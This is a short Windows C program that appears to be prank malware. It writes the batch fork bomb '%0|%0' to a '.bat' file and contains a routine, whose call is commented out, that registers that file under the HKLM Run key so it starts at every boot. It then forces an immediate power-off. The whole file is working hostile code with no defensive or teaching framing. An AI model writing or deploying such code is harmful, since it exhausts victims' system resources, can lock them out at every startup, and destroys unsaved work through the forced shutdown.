#include <stdio.h>
#include <string.h>
#include <windows.h>
char arg[8080];
int len;
int writeinreg()
{
    //找到系统的启动项
    const char *Register = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY hKey;
    //打开注册表启动项
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, Register, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
    {
        //添加一个子Key,并设置值，"Mytest"并不一定是应用程序名字（不加后缀.exe） ，可以自己设置；
        RegSetValueExA(hKey, "???", 0, REG_SZ, (BYTE *)arg, strlen(arg));
        //关闭注册表
        RegCloseKey(hKey);
        // printf("succeed!\n");
        return 1;
    }
    // printf("Failed!");
    return -1;
}
int main(int argc, char *argv[])
{
    //-------------------------buile bat
    freopen(".bat", "w", stdout);
    printf("%0|%0");
    freopen("CON", "w", stdout);
    //-------------------------build dir
    strcpy(arg, *argv);
    len = strlen(arg);
    for (int i = len; i > 0; i--)
    {
        if (arg[i] == '\\')
        {
            len = i;
            break;
        }
        else
            arg[i] = 0;
    }
    const char *a = ".bat";
    strcat(arg, a);
    //-------------------------write in reg
    // writeinreg();
    //-------------------------restart
    system("shutdown -f -p");
    return 0;
}